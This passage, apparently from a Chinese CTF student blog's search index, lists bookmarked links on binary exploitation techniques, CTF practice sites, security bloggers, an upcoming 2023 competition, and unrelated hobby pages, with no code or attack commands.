pwntools用法探索](https://www.xjx100.cn/news/262545.html?action=onClick)\n\n[Index of /ubuntu-releases/ | 清华大学开源软件镜像站 ](https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/)\n\n# CTF工具站：\n\n[在线工具](http://www.hiencode.com/)\n\n[CTF站点导航](https://ctf.mzy0.com/)\n\n[MD5碰撞](https://www.somd5.com/)\n\n# CTF刷题/比赛站\n\n[攻防世界](https://adworld.xctf.org.cn/home/index?rwNmOdr=1686891778736)\n\n[BUU](https://buuoj.cn/)\n\n[DataCon](https://datacon.qianxin.com/competition/competitions/53/introductionhttps://datacon.qianxin.com/competition/competitions/53/introduction)\n\n[PolarD&N](https://polarctf.com/#/page/convert)\n\n[ACTF](https://adworld.xctf.org.cn/match/list?event_hash=706a7a8c-65a0-11ee-ab28-000c29bc20bf)\n\n# 堆\n\n[Tcache bin](https://blog.csdn.net/A951860555/article/details/115442780)\n\n[ctfwiki](https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack.md)\n\n[hook](https://blog.csdn.net/A951860555/article/details/115766826)\n\n[pwn | 堆结构](https://www.cnblogs.com/Mz1-rc/p/17023153.html)\n\n[Unsortedbin Attack ](https://www.52pojie.cn/thread-1467962-1-1.html)\n\n[House of orange ](https://www.wenjiangs.com/doc/6ki1sx0l)\n\n[house of orange](https://blog.csdn.net/aptx4869_li/article/details/122971995)2\n\n[House of orange 3](https://www.wenjiangs.com/doc/6ki1sx0l#EXPlb2.2)\n\n# SROP\n\n[系统调用号](https://blog.csdn.net/winter2121/article/details/119845443)\n\n[Linux SROP 原理与攻击](https://blog.csdn.net/qq_31481187/article/details/73929569)\n\n[[syscall系统调用的简单分析](https://baijiahao.baidu.com/s?id=1658134769561601465&wfr=spider&for=pc)g)\n\n# IOlife\n\n[浅析IOFILE结构及利用](https://blog.csdn.net/w12315q/article/details/84328447)\n\n[HCTF2018 the_end&&babyprintf_var2 Writeup - 知乎](https://zhuanlan.zhihu.com/p/49773291)\n\n[好好说话之IO_FILE利用（1](https://blog.csdn.net/qq_41202237/article/details/113845320)\n\n# C++\n\n[例题1](https://mp.weixin.qq.com/s/Tcu45BJj3JTqD0Pvw1HYng)\n\n# 其他\n\n[Linux学习](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&__biz=MzI5MDk3NTAxNw==&scene=23&album_id=3033094806944350211&count=3#wechat_redirect)\n\n[命令绕过](https://www.yii666.com/blog/338731.html)\n\n[[原创\\]关于不同版本 glibc 更换的一些问题-](https://bbs.kanxue.com/thread-254868.htm)\n\n# 大创\n\n[结题报告 - 列表 | 西北工业大学大学生创新创业训练计划项目管理系统](https://cxcy.nwpu.edu.cn/XM/JieTi/Declare/Index)\n\n[三航杯](https://www.sanhangcup.com/#/student/information)\n\n# 学习无关\n\n## 我的世界\n\n[2022年最新Minecraft村民的职业与交易详解指南](https://baijiahao.baidu.com/s?id=1724382693956990325&wfr=spider&for=pc)\n\n[我的世界药水配方大全2023 最新常用药水配方汇总-骑士助手](https://www.vqs.com/article/10022.html)\n\n[我的世界药水合成表大全 药水合成配方图表汇总_历趣](https://www.liqucn.com/article/270749.shtml)\n\n## 数模\n\n[速成 | 遗传算法详解及其MATLAB实现|代数|算子|matlab_网易订阅](https://www.163.com/dy/article/I6VDJTPR05530N05.html)\n\n## 不知道什么时候想看的剧\n\n[间谍过家家 第二季第01集高速①免费在线播放 - 谍战迷](http://www.diezhanba.me/dongman/jiandieguojiajia_dierji/play-0-0.html)\n"},{"title":"友链","url":"/links/index.html","content":"\n# 我的\n\n[ChatGPT](https://www.gpt.heshi906.xyz/)\n\n[NPUSEC_GitLab](https://git.qwq.cc/npusec2022)\n\n[NPU::CTF](https://ctf.qwq.cc/)\n\n[主页 | AList](http://10.81.2.230:5244/)\n\n# 大师傅们\n\n[xiong's blog - 心血来潮的产物捏～](https://1145.link/)熊神！懂得都懂\n\n[Jelasin](https://jelasin.github.io/) IoT\n\n[korey0sh1](https://korey0sh1.cn/) IoT 人民公安大爹\n\n[TokameinE](https://tokameine.top/) PWN大爹\n\n[Nameless](https://nameless.top/) DAS出题人 IOT大爹\n\n[z1r0's blog](https://www.z1r0.top/) IOT爹\n\n[lewiserii's blog](https://lewiserii.github.io/) 全栈爹，护网，渗透，各种工具，偏web\n\n"},{"title":"近期比赛","url":"/games/index.html","content":"\n# “古剑山\"第一届全国大学生网络攻防大赛初赛\n\n比赛链接: https://www.cqyti.com/info/1143/390372.htm\n\n比赛类型:团队赛|1-3人\n\n报名开始:2023年09月15日18:00:00\n\n报名截止:2023年11月08日18:00:00\n\n比赛开始:2023年12月08日09:00:00\n\n比赛结束:2023年12月08日12:00:00\n\nQQ群:792721897\n\n"}]